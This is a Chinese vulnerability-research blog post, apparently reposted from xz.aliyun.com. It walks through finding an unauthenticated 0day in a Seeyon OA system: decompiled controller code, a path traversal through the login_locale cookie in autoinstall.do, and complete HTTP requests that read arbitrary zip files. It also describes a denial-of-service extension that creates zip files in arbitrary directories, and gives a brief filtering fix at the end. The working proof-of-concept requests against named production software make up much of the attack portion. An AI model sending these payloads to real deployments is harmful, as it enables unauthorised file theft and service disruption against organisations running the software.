#  某大型oa前台0day挖掘  
1771593898321415
                    1771593898321415  只会看监控的实习生   2026-03-08 00:01  
  
## 漏洞sink发现（任意zip文件下载）  
  
  
1.想要寻找文件下载相关的漏洞，自然的联想到下载相关的请求头写法：  
  
```
response.setHeader("Content-Disposition",
```  
  
2.将Lib文件中的jar包拖入jadx-gui进行寻找：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFae0HxianRh4AO4ZurUSlYxXTvjpruku3fIFTfNE3LBehAuJsJAd58kic7SsBJ3KjEx7l8ZbAk8VYkNxsqZY0KEpnuCzywIMHVI/640?wx_fmt=png&from=appmsg "")  
  
  
3.最终定位到如图所示代码：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGibyiaw0nKyhcBHGrEBEtyWeicP41tBVG7jyA6EJEKpyp2VUJh1N907sFRtnozWBsgMhqz4vUS7cVibjXNeMTEByYShP99ejwhNmM/640?wx_fmt=png&from=appmsg "")  
  
  
4.往上跟发现是从cookie里面获取的（cookie内容我们是可控的）：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFEKQWQ20OkwarmicKxsdCFQWw71cgYk11OXas1zhwWcHtCxYibpvXFhBnuQHj9JppXjMm93JG7NYwRu7de58BmuVuLsfFT7nrn5U/640?wx_fmt=png&from=appmsg "")  
  
## poc构造  
  
  
1.我们复制文件的路径com.seeyon.apps.autoinstall.controller.AutoInstallController，在idea中搜索：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFibNc3mGDy6BNZCCnemKkqKhWdD0Z3STaxWdjruA00KB2Y0we7ibKPRhfehHEOUCfUdK8wrLvfnyx79c1QgwaB5MkwgL9gQFAFE/640?wx_fmt=png&from=appmsg "")  
  
  
这个bean标签的name属性，就是我们需要访问的路由：autoinstall.do  
  
  
2.跟进发现AutoInstallController继承BaseController，而BaseController又继承MultiActionController：  
  
  
而且注意，这里有**@NeedlessCheckLogin**  
注解，说明这里是一个前台就能访问的点，**不需要登录**  
！  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGqAFo9r4jNpeVVq9iaPxib7lyic35Redoz5qFzqicTFTBLC85Gjibvq6x9RhcZTjicujlNC84DEfRy7GaAaicEn2jIQsKzMxCkzicAIns/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFGJUoTDntuOiapcqh7Obaa3IT2QYpKxLQUCgEQFJppaB3oiaSgfNb64CYpxflv5OWpf6bgr8HaTr2C41kQ2gJrgibYuTdvp2tKr4/640?wx_fmt=png&from=appmsg "")  
  
  
这里补充一个知识点：MultiActionController是Spring MVC早期提供的一个多方法分发控制器基类    
  
  
我们可以通过搜索methodNameResolver，找到传参方式：这里的value的值就是我们传参的值，也就是method=xxx （xxx为函数名）  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGcMIfibL6nQybicLzgy3eI9jQLp8gSVuoWicrVQjAHHXpYNLRwD6A4BCxkZCibUa4Biadlmib29VoEKicJPIRXNMYibNwpwqbwLETLnL8/640?wx_fmt=png&from=appmsg "")  
  
  
3.来到漏洞函数：  
  
```
@SetContentTypepublic ModelAndView regInstallDown64(HttpServletRequest request, HttpServletResponse response) throws Exception {    String localeName = "";    Cookie[] cookies = request.getCookies();    for(Cookie cookie : cookies) {        if ("login_locale".equals(cookie.getName())) {            localeName = cookie.getValue();        }    }    if (Strings.isBlank(localeName)) {        String lang = request.getHeader("Accept-Language");        Locale defaultLocale = lang == null ? (Locale)LocaleContext.getAllLocales().get(0) : LocaleContext.parseLocale(lang);        localeName = I18nUtil.getLocalAsString(defaultLocale);    }    if (localeName.contains(",")) {        localeName = localeName.substring(0, localeName.indexOf(","));    }    String separator = System.getProperty("file.separator");    String fileName = SystemEnvironment.getSystemTempFolder() + separator + "regInstall64_" + request.getServerName() + "_" + localeName + ".zip";    String url = request.getRequestURL().toString();    url = url.substring(0, url.indexOf(SystemEnvironment.getContextPath() + "/"));    OutputStream out = null;    BufferedInputStream br = null;    BufferedWriter writer = null;    try {        if (!(new CtpLocalFile(fileName)).exists()) {            String productLine = SystemEnvironment.getProductLine().replace("V5", "").replace("+", "");            String regDir1 = SystemEnvironment.getApplicationFolder() + separator + "autoinstall" + separator + "regInstall64";            String regDir2 = SystemEnvironment.getApplicationFolder() + separator + "autoinstall" + separator + "V5Common";            String tempDir = SystemEnvironment.getSystemTempFolder() + separator + UUID.randomUUID().toString() + separator + "regInstall64";            String urlTxt = tempDir + separator + "SeeyonActivexInstall" + separator + "url.txt";            String localeTxt = tempDir + separator + "SeeyonActivexInstall" + separator + "locale.txt";            CtpLocalFile tempFile = new CtpLocalFile(tempDir);            if (!tempFile.exists()) {                tempFile.mkdirs();            }            FileUtils.copyDirectoryToDirectory(new CtpLocalFile(regDir2), new CtpLocalFile(tempDir + separator + "SeeyonActivexInstall"));            FileUtils.moveDirectory(new CtpLocalFile(tempDir + separator + "SeeyonActivexInstall" + separator + "V5Common"), new CtpLocalFile(tempDir + separator + "SeeyonActivexInstall" + separator + productLine));            FileUtils.copyDirectoryToDirectory(new CtpLocalFile(regDir1), new CtpLocalFile((new CtpLocalFile(tempDir)).getParent()));            CtpLocalFile urlFile = new CtpLocalFile(urlTxt);            if (!urlFile.exists()) {                urlFile.createNewFile();            }            CtpLocalFile localeFile = new CtpLocalFile(localeTxt);            if (!localeFile.exists()) {                localeFile.createNewFile();            }            BufferedWriter var32 = new BufferedWriter(new FileWriter(new CtpLocalFile(urlTxt)));            var32.write(url);            var32.flush();            var32.close();            writer = new BufferedWriter(new FileWriter(new CtpLocalFile(localeTxt)));            writer.write(localeName);            writer.flush();            writer.close();            if (!(new CtpLocalFile(fileName)).exists()) {                ZipUtil.zip(new CtpLocalFile(tempDir), new CtpLocalFile(fileName), false, "GBK", ResourceUtil.getString("common.auto.install.Note2"));            }        }        br = new BufferedInputStream(new FileInputStream(fileName));        byte[] buf = new byte[1024];        int len = 0;        response.setContentType("application/x-msdownload; charset=UTF-8");        response.setHeader("Content-disposition", "attachment;filename=\"SeeyonActivexInstall64_" + localeName + ".zip\"");        out = response.getOutputStream();        while((len = br.read(buf)) > 0) {            out.write(buf, 0, len);        }    } catch (Exception e) {        if (e.getClass().getSimpleName().equals(this.clientAbortExceptionName)) {            log.debug("辅助程序下载异常：" + e.getMessage());        } else {            log.error("", e);        }    } finally {        if (out != null) {            out.close();        }        if (br != null) {            br.close();        }        if (writer != null) {            writer.close();        }    }    return null;}
```  
  
4.我们先构造数据包，传入正常的cookie进行调试，找到文件读取的路径，如图：  
  
  
（**构造流程如下：该oa有一个contextPath为seeyon，大多数的路由都是以seeyon为根路由，而autoinstall.do正是我们之前寻找到的Controller对应bean属性的name值，method=漏洞存在的函数**  
）  
  
```
POST /seeyon/autoinstall.do HTTP/1.1Host: 192.168.127.129X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01Origin: http://192.168.127.129Referer: http://192.168.127.129/seeyon/main.do?method=mainAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: login_locale=zh_CN;Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 23method=regInstallDown64
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHibU2N6xibQK5y3ucicHQiaDPiaRjvQoXhD1F521icpl6ibiaGaJmX941Fo6ibgB3th0JObZGIKy4DeKt3lAtqkVkXdWVUEJuThbwyzibaY/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGjRiav5NWzoQnbZzIQAc9h7bGE3uU2vsgbMZnS7GHictFSqic35B1thiaYGK99TA6CmzbRicmdXs3d9icscqwokwI28iaHZMnNf0L4qI/640?wx_fmt=png&from=appmsg "")  
  
  
这里，我们找到了正常流程所在的目录：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFH4lERNtdEBwu2L3eZYRwFdBC2s584pzzCXyibJ3CI0GBadW1Su57ibe71lEo5N5KEugk26SnibN3CacN8HUibUfcjo0icdveYwiaZoc/640?wx_fmt=png&from=appmsg "")  
  
  
下载在这里：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFG3gDyHTS4RDG9fNNKHxG3xhPXuCibAy7tsiajQ7FQ5mYEKpPU4stVJ8ebdibjhqUEq4X6uXEowmRWWOa211s4a0boIfAAaGXz56I/640?wx_fmt=png&from=appmsg "")  
  
  
5.知道了文件所在路径，**由于cookie中并没有对目录穿越字符../的限制，代码中也没有对../进行限制**  
，因此我们可以对login_locale进行构造，读取任意目录下的zip文件。  
  
  
6.假设Logs目录存在一份打包过的Logs.zip文件，这里我们尝试读取它：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFBTxX8WgPn8KFsSuiaY1rKhNFjJrAMm5xvxHRtp3C0OQflGVictGzRics3jia6beABJf82rCVaKugljQYZmWmboiblgG8qddTQyy00/640?wx_fmt=png&from=appmsg "")  
  
  
根据上一步可知，我们之前的目录在C:\Seeyon\A8\base\temporary ，这样子是相差了两层目录，而代码中：  
  
```
String fileName = SystemEnvironment.getSystemTempFolder() + separator + "regInstall64_" + request.getServerName() + "_" + localeName + ".zip";
```  
  
这里如果我们使用目录穿越，也就是localeName存在../字符，那么前面的"regInstall64_" + request.getServerName() + "_"又会多出一个不存在的目录，因此我们需要跨越三层目录才能够读到Logs.zip。  
  
  
漏洞poc如下：（构造login_locale=/../../../Logs;）  
  
```
POST /seeyon/autoinstall.do HTTP/1.1Host: 192.168.127.129X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01Origin: http://192.168.127.129Referer: http://192.168.127.129/seeyon/main.do?method=mainAccept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: login_locale=/../../../Logs;Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 23method=regInstallDown64
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFE7Z5cticvcicIc5A7CNG1VwfVibDnKynIEmuop8uGoW0JJlRDbypTV1kCehXx7Ovrwh3LY5sKdTpT6SprK48icTBx9ibOfLDelYbjs/640?wx_fmt=png&from=appmsg "")  
  
  
成功在前台读取到Logs.zip文件。  
  
  
7.我们使用成功的payload，再跟一下代码：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHic7OZLVwb2HlaTibRjU3DiagBI9h0I0DLDm53NNRI6VruLR3qYghn7icd86skdXyxQpFeBISz4d1KCkibdC92z41QOpy9phGGy5Wg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFHufq4lNrd3zCSSkjEaQzkYQqo1a3yMkJX44DfGjSlPsxc0j0Dmzzqw6OaGYXfnJPfBib0XOTzFWuomNFWpWcJMCiaYp0qibce1UE/640?wx_fmt=png&from=appmsg "")  
  
  
可以看到，这里已经跨目录成功  
  
## 漏洞延伸（dos攻击）  
  
  
1.分析完漏洞可以发现，该漏洞可以读取系统中的任意zip文件，但是我们不好猜测文件的名字，因此略显鸡肋，因此我们继续看代码，看看有没有能够对系统造成破坏的点。  
  
  
2.问题就出现在这里：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFRQnKV2wzsut8MvynibMoQES0RFr8iaGmZib9DZe3kDkBbmNRCXJ6DHrMowBtHfbzSiatuLmq6hGic2XSnR5uTmhhbUMbicFfy1Djnc/640?wx_fmt=png&from=appmsg "")  
  
  
这里的CtpLocalFile就是对原生File类的一个封装，这段话的意思就是，如果fileName不存在，就重新创建一个，并且把一堆东西放入fileName，那这个fileName是什么呢，就是我们传入的login_locale进行拼接的呀，也就是说，我们可以**短时间内传入任意名字的压缩包到任意目录，进行dos攻击：**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGgcjOjzAeeRzZ8UZ8srD17Chr1YLQFrVhSmuJ6YttWaRsuQCYSRPWXicevR35bxJZ3Nj8RXT3Hm8gSFPj65DQst6MSxEAia3Etg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGyHF6VZpwN6ItmEmC5DKY4m4R9gE1dtTicd4PEgrOY1bmmvnebrkU3dhv1gtUjibenGVcbzchwkH0dle5lAAUjbaSibiaKMFkcsHc/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞防护  
  
  
说到防护，那自然是对login_locale进行字符过滤，防止传入../等恶意字符串进行跨目录的操作。  
  
  
原文链接：  
https://xz.aliyun.com/news/91624  
  
